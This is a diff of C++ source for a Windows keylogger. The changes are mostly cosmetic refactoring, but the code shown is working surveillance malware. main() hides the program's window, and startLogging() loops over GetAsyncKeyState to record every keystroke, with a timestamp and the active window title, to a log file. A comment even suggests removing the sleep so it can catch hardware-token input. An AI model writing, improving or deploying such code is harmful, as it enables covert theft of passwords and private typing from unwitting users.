@@ -20,19 +20,20 @@
 
 #define _WIN32_WINNT 0x0500
 
-#include <chrono>
+#include "main.hpp"
+
+#include <direct.h>
+#include <windows.h>
+
+#include <chrono>  // NOLINT [build/c++11]
 #include <cstdint>
 #include <cstdlib>
 #include <ctime>
-#include <direct.h>
 #include <fstream>
 #include <iostream>
 #include <map>
 #include <string>
 #include <vector>
-#include <windows.h>
-
-#include "main.hpp"
 
 // #if  _WIN32_WINNT < 0x0500
 // #undef  _WIN32_WINNT
@@ -46,8 +47,7 @@ void openLogFile(char *filepath) { logfile.open(filepath); }
 bool isLogFileOpen() { return logfile.is_open(); }
 
 void closeLogFile() {
-  if (isLogFileOpen())
-    logfile.close();
+  if (isLogFileOpen()) logfile.close();
 }
 
 void hideWindow() {
@@ -102,11 +102,16 @@ void setupStreams(char *buffer, const int length) {
 /**
  * Logs keystrokes from keybooard and dumps to file
  *
- * This function sleeps for sleepMilliseconds milliseconds to minimise
+ * This function sleeps for SLEEP_IN_MILLSECONDS milliseconds to minimise
  * cpu usage.
  */
 void startLogging() {
-  logfile << "KEY|TIME|WINDOW\n";
+  const int TIMESTAMP_STR_LENGTH = 32;
+  const char *TIMESTAM_STR_FMT = "%Y-%m-%d_%H:%M:%S";
+  const int WINDOW_TITLE_LENGTH = 2048;
+  const int SLEEP_IN_MILLSECONDS = 10;
+
+  logfile << "TIME|KEY|WINDOW\n";
 
   std::chrono::time_point<std::chrono::system_clock> system_clock =
       std::chrono::system_clock::now();
@@ -114,51 +119,48 @@ void startLogging() {
   std::map<std::int16_t, std::vector<std::string>> keys = vk();
   std::map<std::int16_t, std::vector<std::string>>::const_iterator keyit;
 
-  const int timestamp_length = 32;
-  const char *timestamp_fmt = "%Y-%m-%d_%H:%M:%S";
-  char *timestamp = (char *)calloc(timestamp_length, sizeof(char));
+  char *timestamp = (char *)calloc(  // NOLINT [readability/casting]
+      TIMESTAMP_STR_LENGTH, sizeof(char));
   std::string character_key;
 
-  bool shift_key;
+  bool is_shift_key_pressed;
 
   // Windows handle & title
   HWND activeWindowHandler;
 
-  const int activeWindowTitleLength = 2048;
-  TCHAR activeWindowTitle[activeWindowTitleLength];
+  // TCHAR activeWindowTitle[WINDOW_TITLE_LENGTH];
+  TCHAR *activeWindowTitle = (TCHAR *)calloc(  // NOLINT [readability/casting]
+      WINDOW_TITLE_LENGTH, sizeof(TCHAR));
 
-  const int sleepMilliseconds = 15;
   while (true) {
-    shift_key = false;
+    is_shift_key_pressed = false;
     activeWindowHandler = GetForegroundWindow();
 
     for (keyit = keys.begin(); keyit != keys.end(); ++keyit) {
       system_clock = std::chrono::system_clock::now();
       std::time_t system_time =
           std::chrono::system_clock::to_time_t(system_clock);
-      std::strftime(timestamp, timestamp_length, timestamp_fmt,
+      std::strftime(timestamp, TIMESTAMP_STR_LENGTH, TIMESTAM_STR_FMT,
                     std::localtime(&system_time));
 
       std::int16_t key_state = GetAsyncKeyState(keyit->first);
       GetWindowText(activeWindowHandler, activeWindowTitle,
-                    activeWindowTitleLength);
+                    WINDOW_TITLE_LENGTH);
 
       // Shift key is down. MSB is set.
       if (key_state == -32768 && keyit->first == 16) {
-        shift_key = true;
+        is_shift_key_pressed = true;
       }
 
       // Key state has changed. LSB is set.
       if (key_state == -32767) {
-        // Handle Uppercase Characters
-        if (shift_key) {
+        if (is_shift_key_pressed) {
+          // Handle Uppercase Characters
           logfile << timestamp << "|" << keyit->second[1] << "|\"";
           logfile << activeWindowTitle << "\"\n";
           character_key = keyit->second[1];
-        }
-
-        // Handle Lowercase Characters
-        else {
+        } else {
+          // Handle Lowercase Characters
           logfile << timestamp << "|" << keyit->second[0] << "|\"";
           logfile << activeWindowTitle << "\"\n";
           character_key = keyit->second[0];
@@ -169,15 +171,19 @@ void startLogging() {
     // Sleep() requires WinXP or later (sleep 15 milliseconds)
     // Can be removed entirely to capture Yubikey, etc.
     // but may be CPU intensive
-    Sleep(sleepMilliseconds);
+    Sleep(SLEEP_IN_MILLSECONDS);
   }
 }
 
 int main() {
   hideWindow();
+
   const int filename_length = 120;
-  char *filename = (char *)calloc(filename_length, sizeof(char));
+  char *filename = (char *)calloc(  // NOLINT [readability/casting]
+      filename_length, sizeof(char));
+
   std::cout << strlen(filename) << "\n" << filename;
+
   setupStreams(filename, filename_length);
 
   openLogFile(filename);
